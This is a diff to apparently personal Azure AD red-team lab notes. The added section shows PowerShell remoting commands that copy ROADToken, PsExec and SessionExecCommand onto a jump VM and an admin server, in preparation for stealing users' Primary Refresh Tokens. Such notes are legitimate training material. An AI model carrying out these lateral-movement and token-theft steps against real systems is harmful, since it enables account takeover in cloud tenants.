@@ -1256,7 +1256,34 @@ Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\student
 How do we know which user's PRT is available?
 - basic enumeration using a tool like seatbelt (also checkout LSA Whisperer?)
 - run `qwinsta` or `get-process` - users will be listed as `AzureAD\User`
-- 
+
+#### Session play
+Using the PSRemoting session to jumpvm, create a directory/folder on infradminsrv:
+```
+Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\studentx}
+exit
+```
+
+Let's copy over some tools to the jumpvm. Remember to exit from the PSRemoting session before running the below commands: 
+```
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose 
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose 
+PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\studentx.jumpvm\Documents –Verbose
+```
+
+Now, connect back to jumpvm and now copy tools to infradminsrv using the PSRemoting Session that we created earlier: 
+```
+[51.116.180.87]: PS C:\Users\studentx.jumpvm\Documents> Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\ROADToken.exe -Destination C:\Users\Public\studentx –Verbose
+[51.116.180.87]: PS C:\Users\studentx.jumpvm\Documents> Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\PsExec64.exe -Destination C:\Users\Public\studentx –Verbose
+[51.116.180.87]: PS C:\Users\studentx.jumpvm\Documents> Copy-Item -ToSession $infradminsrv -Path C:\Users\studentx.jumpvm\Documents\SessionExecCommand.exe -Destination C:\Users\Public\studentx –Verbose
+```
+
+Check if all the files are copied properly: 
+```
+[51.116.180.87]: PS C:\Users\studentx.jumpvm\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{ls C:\Users\Public\studentx}
+```
+
+
 #### Get nonce
 ```
 $TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
